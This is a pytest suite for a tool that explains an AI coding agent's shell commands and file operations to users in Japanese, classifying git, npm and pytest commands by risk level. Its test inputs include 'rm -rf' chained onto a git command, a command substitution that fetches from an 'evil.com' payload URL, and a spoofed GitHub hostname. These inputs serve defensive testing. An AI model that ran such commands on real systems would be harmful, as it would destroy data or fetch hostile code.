#!/usr/bin/env python3
"""tests/test_translation_konjac.py — Rigorous Adversarial Tests for Translation Konjac P0.

Tests:
1. Shell chaining & redirection security (&&, ;, ||, |, >, command substitutions).
2. Exact token matching for npm subcommands (preventing npm token from matching npm test).
3. Test execution side-effect boundaries (no false assertion of read-only/no-network).
4. Git add . (bounded) vs git add -A / --all (whole repository).
5. Git commit normal vs git commit --amend (history rewrite).
6. Git push flags (--force-with-lease=..., --all, --tags, refspecs e.g. refs/heads/x:refs/heads/main, no-arg push).
7. Remote hostname exact resolution and credential sanitization.
8. File Write semantics (distinguishing new vs overwrite).
9. Decoupled language pack validation and fail-visible translation fallback.
"""

import ast
import json
import os
import sys
import tempfile
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "runtime"))
import translation_konjac as konjac
import common_language_pack as pack


def _imported_module_names(path):
    with open(path, "r", encoding="utf-8") as handle:
        tree = ast.parse(handle.read(), filename=path)
    names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            names.add(node.module.split(".")[0])
    return names


def test_translation_module_declares_presentation_only_contract():
    assert "Presentation-only boundary:" in (konjac.__doc__ or "")


def test_translation_and_authority_import_boundaries_are_disjoint():
    """Konjac is a display adapter; authority/gate modules remain independent."""
    root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    translation_path = os.path.join(root, "runtime", "translation_konjac.py")
    translation_imports = _imported_module_names(translation_path)
    assert not translation_imports.intersection(
        {"tool_policy", "lease_gate_runner", "local_execution_gate", "mothership", "action_authority"}
    )

    authority_paths = (
        os.path.join(root, "runtime", "tool_policy.py"),
        os.path.join(root, "runtime", "human_layer_adapter.py"),
        os.path.join(root, "adapters", "claude-code", "lease_gate_runner.py"),
    )
    for path in authority_paths:
        assert "translation_konjac" not in _imported_module_names(path), path


# -----------------------------------------------------------------------------
# 1. Shell Chaining, Pipeline, and Redirection Security
# -----------------------------------------------------------------------------

def test_compound_command_escalates_to_destructive():
    """git status && rm -rf temp/ must NOT be translated as read-only status."""
    res = konjac.translate_bash_command("git status && rm -rf temp/", "/tmp")
    assert res.concept_id == "shell.compound"
    assert res.effect_level == konjac.EffectLevel.DESTRUCTIVE
    assert "複合処理" in res.headline
    assert "rm -rf" in res.explanation or "削除" in res.explanation
    assert res.is_known is True


def test_redirection_escalates_to_local_write():
    """git status > status.txt writes to a file and must be marked LOCAL_WRITE."""
    res = konjac.translate_bash_command("git status > status.txt", "/tmp")
    assert res.effect_level == konjac.EffectLevel.LOCAL_WRITE
    assert "リダイレクト" in res.explanation or "書き込み" in res.explanation


def test_test_chained_with_external_mutation():
    """python -m pytest && curl -X POST ... must not be treated as purely local test."""
    res = konjac.translate_bash_command("python3 -m pytest tests && curl -X POST https://example.com/webhook", "/tmp")
    assert res.concept_id == "shell.compound"
    assert res.effect_level == konjac.EffectLevel.UNKNOWN
    assert "複合処理" in res.headline


def test_command_substitution_escalates_to_unknown():
    """git diff $(malicious_subshell) contains subshell execution."""
    res = konjac.translate_bash_command("git diff $(curl https://evil.com/payload)", "/tmp")
    assert res.effect_level == konjac.EffectLevel.UNKNOWN


# -----------------------------------------------------------------------------
# 2. NPM Subcommand Token Precision
# -----------------------------------------------------------------------------

def test_npm_test_matches_exact_tokens():
    res1 = konjac.translate_bash_command("npm test", "/tmp")
    assert res1.concept_id == "test.npm"
    assert res1.effect_level == konjac.EffectLevel.TEST_EXECUTION

    res2 = konjac.translate_bash_command("npm t", "/tmp")
    assert res2.concept_id == "test.npm"

    res3 = konjac.translate_bash_command("npm run test", "/tmp")
    assert res3.concept_id == "test.npm"


def test_npm_token_does_not_match_npm_test():
    """npm token ... must never match npm test!"""
    res = konjac.translate_bash_command("npm token create --read-only", "/tmp")
    assert res.concept_id != "test.npm"
    assert res.effect_level == konjac.EffectLevel.UNKNOWN


def test_npm_install_matches_exact():
    res = konjac.translate_bash_command("npm install express", "/tmp")
    assert res.concept_id == "package.npm.install"
    assert res.effect_level == konjac.EffectLevel.LOCAL_WRITE


# -----------------------------------------------------------------------------
# 3. Test Execution Semantics (pytest / npm test)
# -----------------------------------------------------------------------------

def test_pytest_semantics_acknowledge_possible_side_effects():
    res = konjac.translate_bash_command("python3 -m pytest tests/ -q", "/tmp")
    assert res.concept_id == "test.pytest"
    assert res.effect_level == konjac.EffectLevel.TEST_EXECUTION
    assert "コード変更なし" not in res.locality_badge
    assert "ネット送信なし" not in res.locality_badge
    assert "副作用" in res.locality_badge or "副作用" in res.explanation


# -----------------------------------------------------------------------------
# 4. Git Add Concept Separation (dot vs -A / --all)
# -----------------------------------------------------------------------------

def test_git_add_dot_is_spatially_bounded():
    res = konjac.translate_bash_command("git add .", "/tmp")
    assert res.concept_id == "git.add.dot"
    assert "現在いる場所以下" in res.headline
    assert "全体" not in res.headline


def test_git_add_all_is_repository_wide():
    res1 = konjac.translate_bash_command("git add -A", "/tmp")
    assert res1.concept_id == "git.add.all"
    assert "リポジトリ全体" in res1.headline

    res2 = konjac.translate_bash_command("git add --all", "/tmp")
    assert res2.concept_id == "git.add.all"
    assert "リポジトリ全体" in res2.headline


# -----------------------------------------------------------------------------
# 5. Git Commit (Normal vs Amend)
# -----------------------------------------------------------------------------

def test_git_commit_normal():
    res = konjac.translate_bash_command('git commit -m "fix bug"', "/tmp")
    assert res.concept_id == "git.commit.normal"
    assert "上書き" not in res.headline
    assert "PC内のGit履歴に保存" in res.headline


def test_git_commit_amend_history_rewrite():
    res = konjac.translate_bash_command('git commit --amend -m "fix typo"', "/tmp")
    assert res.concept_id == "git.commit.amend"
    assert "直前のCommit履歴を上書き" in res.headline


# -----------------------------------------------------------------------------
# 6. Git Push Flags, Refspecs, and Deletions
# -----------------------------------------------------------------------------

def test_git_push_normal():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push origin feature-login", cwd)
    assert res.concept_id == "git.push.normal"
    assert res.effect_level == konjac.EffectLevel.EXTERNAL_TRANSMIT
    assert "feature-login" in res.headline
    assert "Merge" in res.locality_badge


def test_git_push_to_main_branch_warns():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push origin main", cwd)
    assert res.concept_id == "git.push.main"
    assert "本線「main」" in res.headline
    assert res.effect_level == konjac.EffectLevel.EXTERNAL_TRANSMIT


def test_git_push_refspec_with_full_path():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push origin refs/heads/my-feature:refs/heads/main", cwd)
    assert res.concept_id == "git.push.main"
    assert "本線「main」" in res.headline


def test_git_push_force_with_lease_equal_value():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push --force-with-lease=main origin feature-login", cwd)
    assert res.concept_id == "git.push.force"
    assert res.effect_level == konjac.EffectLevel.DESTRUCTIVE


def test_git_push_all_and_tags():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res_all = konjac.translate_bash_command("git push --all origin", cwd)
    assert res_all.concept_id == "git.push.all"
    assert res_all.effect_level == konjac.EffectLevel.EXTERNAL_TRANSMIT

    res_tags = konjac.translate_bash_command("git push --tags origin", cwd)
    assert res_tags.concept_id == "git.push.tags"
    assert res_tags.effect_level == konjac.EffectLevel.EXTERNAL_TRANSMIT


def test_git_push_no_args():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push", cwd)
    assert res.concept_id in ("git.push.normal", "git.push.main")
    assert res.effect_level == konjac.EffectLevel.EXTERNAL_TRANSMIT


# -----------------------------------------------------------------------------
# 7. Remote Host Matching and Credential Sanitization
# -----------------------------------------------------------------------------

def test_sanitize_remote_url_github():
    service, host = konjac.sanitize_remote_url("https://github.com/org/repo.git")
    assert service == "GitHub"
    assert host == "github.com"

    service_ssh, host_ssh = konjac.sanitize_remote_url("git@github.com:org/repo.git")
    assert service_ssh == "GitHub"
    assert host_ssh == "github.com"


def test_sanitize_remote_url_strips_credentials():
    url = "https://user:ghp_secret_token_12345@github.com/org/repo.git"
    service, host = konjac.sanitize_remote_url(url)
    assert service == "GitHub"
    assert host == "github.com"
    assert "secret_token" not in service
    assert "secret_token" not in host


def test_sanitize_remote_url_spoofed_host_not_github():
    service, host = konjac.sanitize_remote_url("https://github.com.evil.example/org/repo.git")
    assert service != "GitHub"
    assert host == "github.com.evil.example"
    assert "Git保管先 (github.com.evil.example)" in service


# -----------------------------------------------------------------------------
# 8. Tool Write / Edit / Read Semantics
# -----------------------------------------------------------------------------

def test_read_tool_does_not_claim_no_external_transmission():
    res = konjac.translate_tool_event("Read", {"file_path": "/test/README.md"}, "/test")
    assert res.concept_id == "fs.read"
    assert "外部送信なし" not in res.locality_badge
    assert "GitHub等の変更なし" in res.locality_badge


def test_write_tool_distinguishes_new_vs_overwrite():
    with tempfile.TemporaryDirectory() as tmpdir:
        new_file = os.path.join(tmpdir, "new_file.txt")
        res_new = konjac.translate_tool_event("Write", {"file_path": new_file}, tmpdir)
        assert res_new.concept_id == "fs.write_new"
        assert "新しく作成" in res_new.headline

        with open(new_file, "w") as f:
            f.write("content")

        res_overwrite = konjac.translate_tool_event("Write", {"file_path": new_file}, tmpdir)
        assert res_overwrite.concept_id == "fs.write_overwrite"
        assert "上書き保存" in res_overwrite.headline


# -----------------------------------------------------------------------------
# 9. Language Pack & Fail-Visible Fallback
# -----------------------------------------------------------------------------

def test_language_pack_loaded_from_json():
    assert "git.status" in pack.JA_CONCEPT_PACK
    assert "git.commit.normal" in pack.JA_CONCEPT_PACK
    assert "error.command_failed" in pack.JA_CONCEPT_PACK


def test_fail_visible_banner():
    fallback_match = konjac.ConceptMatch("fallback.failure", konjac.EffectLevel.UNKNOWN, "error_test", False)
    res = konjac.render_concept(fallback_match)
    banner = konjac.format_user_banner(res, permission_context=True)
    assert "解説生成失敗" in banner or "日本語解説を生成できませんでした" in banner

# -----------------------------------------------------------------------------
# 10. Strict Flag Allowlists & Flag Regression Tests
# -----------------------------------------------------------------------------

def test_git_push_prune_flag_is_unknown():
    """--prune must never fall through to normal push!"""
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push --prune origin", cwd)
    assert res.concept_id == "unknown.command"
    assert res.effect_level == konjac.EffectLevel.UNKNOWN


def test_git_push_atomic_flag_is_unknown():
    cwd = os.path.dirname(os.path.abspath(__file__))
    res = konjac.translate_bash_command("git push --atomic origin main", cwd)
    assert res.concept_id == "unknown.command"
    assert res.effect_level == konjac.EffectLevel.UNKNOWN


def test_git_add_all_with_pathspec():
    res = konjac.translate_bash_command("git add -A src/", "/tmp")
    assert res.concept_id == "git.add.path"
    assert "src/" in res.headline


def test_git_commit_unknown_flag_is_unknown():
    res = konjac.translate_bash_command("git commit --fixup HEAD", "/tmp")
    assert res.concept_id == "unknown.command"
    assert res.effect_level == konjac.EffectLevel.UNKNOWN


# -----------------------------------------------------------------------------
# 11. Zero-Manual-JSON Setup & Ownership-Scoped Disconnect Tests
# -----------------------------------------------------------------------------

def test_hook_setup_service_e2e_and_disconnect_preserves_unrelated_settings():
    import hook_setup_service as hss
    with tempfile.TemporaryDirectory() as tmpdir:
        settings_file = os.path.join(tmpdir, "settings.json")
        pkg_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        unrelated_helper = os.path.join(tmpdir, "my-ume-harness-helper", "pretooluse_hook.py")
        original = {
            "theme": "dark",
            "hooks": {
                "PreToolUse": [
                    {
                        "matcher": "Read",
                        "hooks": [{"type": "command", "command": unrelated_helper}],
                    }
                ],
                "Stop": [
                    {
                        "matcher": "*",
                        "hooks": [{"type": "command", "command": "/opt/custom/stop.py"}],
                    }
                ],
            },
        }
        with open(settings_file, "w", encoding="utf-8") as f:
            json.dump(original, f, ensure_ascii=False, indent=2)

        # 1. Fresh Install
        ok, msg = hss.install_hooks_to_settings(pkg_root, settings_file)
        assert ok is True
        assert os.path.exists(settings_file)

        with open(settings_file, "r") as f:
            data = json.load(f)
        assert "PreToolUse" in data["hooks"]
        assert "PermissionRequest" in data["hooks"]
        assert "PostToolUseFailure" in data["hooks"]

        # 2. Second Install (Idempotency)
        ok2, _ = hss.install_hooks_to_settings(pkg_root, settings_file)
        assert ok2 is True
        with open(settings_file, "r") as f:
            data2 = json.load(f)
        canonical = hss.get_adapter_hook_paths(pkg_root)
        for event_name, command in canonical.items():
            commands = [
                item.get("command")
                for group in data2["hooks"][event_name]
                for item in group.get("hooks", [])
            ]
            assert commands.count(command) == 1

        owned_pretool_group = next(
            group for group in data2["hooks"]["PreToolUse"]
            if any(item.get("command") == canonical["PreToolUse"] for item in group["hooks"])
        )
        owned_pretool_group["matcher"] = "Bash"
        owned_pretool_group["timeout"] = 123

        # A substring match must never claim this user-owned hook.
        pretool_commands = [
            item.get("command")
            for group in data2["hooks"]["PreToolUse"]
            for item in group.get("hooks", [])
        ]
        assert unrelated_helper in pretool_commands

        # 3. Changes made after setup must survive disconnect.
        data2["theme"] = "light"
        data2["post_setup_user_state"] = {"preserve": True}
        with open(settings_file, "w", encoding="utf-8") as f:
            json.dump(data2, f, ensure_ascii=False, indent=2)

        ok_dc, msg_dc = hss.disconnect_hooks_from_settings(pkg_root, settings_file)
        assert ok_dc is True
        assert "切断" in msg_dc
        with open(settings_file, "r", encoding="utf-8") as f:
            disconnected = json.load(f)

        assert disconnected["theme"] == "light"
        assert disconnected["post_setup_user_state"] == {"preserve": True}
        assert disconnected["hooks"]["Stop"] == original["hooks"]["Stop"]
        remaining_pretool = [
            item.get("command")
            for group in disconnected["hooks"]["PreToolUse"]
            for item in group.get("hooks", [])
        ]
        assert remaining_pretool == [unrelated_helper]
        preserved_matcher = next(
            group for group in disconnected["hooks"]["PreToolUse"]
            if group.get("matcher") == "Bash"
        )
        assert preserved_matcher == {"matcher": "Bash", "timeout": 123, "hooks": []}
        for event_name, command in canonical.items():
            remaining = [
                item.get("command")
                for group in disconnected.get("hooks", {}).get(event_name, [])
                for item in group.get("hooks", [])
            ]
            assert command not in remaining

        # An idempotent no-op disconnect must preserve the file bytes.
        before_noop = open(settings_file, "rb").read()
        ok_noop, _ = hss.disconnect_hooks_from_settings(pkg_root, settings_file)
        assert ok_noop is True
        assert open(settings_file, "rb").read() == before_noop
